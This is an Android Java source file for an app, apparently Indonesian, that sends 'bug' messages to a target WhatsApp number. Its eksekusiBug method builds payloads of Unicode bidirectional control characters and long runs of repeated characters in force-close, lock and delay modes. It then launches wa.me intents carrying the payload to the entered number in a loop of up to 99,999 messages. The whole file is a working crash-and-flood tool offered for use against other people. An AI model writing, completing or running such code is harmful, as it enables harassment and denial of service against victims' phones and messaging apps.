package com.langz.bug;

import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.view.View;
import android.widget.Button;
import android.widget.CheckBox;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.RadioGroup;
import android.widget.Toast;
import android.widget.VideoView;
import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {

    EditText target, delayInput;
    CheckBox waBisnis;
    RadioGroup modeBug;
    Button kirim, btnLogin;
    LinearLayout formInput;
    VideoView videoAnimasi;

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        setContentView(R.layout.activity_main);

        target = findViewById(R.id.target);
        delayInput = findViewById(R.id.delay);
        waBisnis = findViewById(R.id.wa_bisnis);
        modeBug = findViewById(R.id.mode_bug);
        kirim  = findViewById(R.id.kirim);
        btnLogin = findViewById(R.id.btn_login);
        formInput = findViewById(R.id.form_input);
        videoAnimasi = findViewById(R.id.video_animasi);

        // SETUP VIDEO
        String videoPath = "android.resource://" + getPackageName() + "/" + R.raw.video_bug;
        Uri uri = Uri.parse(videoPath);
        videoAnimasi.setVideoURI(uri);
        videoAnimasi.start();

        videoAnimasi.setOnPreparedListener(mp -> {
            mp.setLooping(true); 
        });

        // Tombol Login
        btnLogin.setOnClickListener(v -> {
            formInput.setVisibility(View.VISIBLE);
            btnLogin.setVisibility(View.GONE);
            Toast.makeText(this, "Login Berhasil!", Toast.LENGTH_SHORT).show();
        });

        // Tombol Eksekusi
        kirim.setOnClickListener(v -> {
            String nomor = target.getText().toString().trim();
            if (nomor.isEmpty()) {
                Toast.makeText(this, "Nomor target mana bangsat?", Toast.LENGTH_SHORT).show();
                return;
            }

            long jeda = 50;
            // CEK: Kalau delayInput atau modeBug nggak ada di layout baru, ini bakal error.
            // Jadi kita pake try-catch biar aman.
            try { 
                jeda = Long.parseLong(delayInput.getText().toString()); 
            } catch (Exception e) {}

            String paketWA = waBisnis != null && waBisnis.isChecked() ? "com.whatsapp.w4b" : "com.whatsapp";
            
            String mode = "FC";
            if (modeBug != null) {
                int selectedMode = modeBug.getCheckedRadioButtonId();
                if (selectedMode == R.id.mode_lock) mode = "LOCK";
                else if (selectedMode == R.id.mode_delay) { mode = "DELAY"; jeda = 0; }
            }

            eksekusiBug(nomor, paketWA, jeda, mode);
        });
    }

    private void eksekusiBug(String nomor, String paketWA, long jeda, String mode) {
        Handler h = new Handler(Looper.getMainLooper());
        StringBuilder sb = new StringBuilder();
        sb.append("\u202E\u202D\u202C\u200F\u200E");
        
        if (mode.equals("FC")) { for (int i = 0; i < 50000; i++) sb.append("A"); }
        else if (mode.equals("LOCK")) { for (int i = 0; i < 15000; i++) sb.append("\u202E\u200F\u202D"); }
        else if (mode.equals("DELAY")) { for (int i = 0; i < 5000; i++) sb.append("B"); }
        
        final String payload = sb.toString();

        Runnable r = new Runnable() {
            int count = 0;
            @Override
            public void run() {
                if (count >= 99999) return;
                try {
                    Intent i = new Intent(Intent.ACTION_VIEW);
                    i.setPackage(paketWA);
                    i.setData(Uri.parse("https://wa.me/" + nomor + "?text=" + Uri.encode(payload + count)));
                    i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    startActivity(i);
                } catch (Exception e) {}
                count++;
                h.postDelayed(this, jeda);
            }
        };
        h.post(r);
    }
                                 }
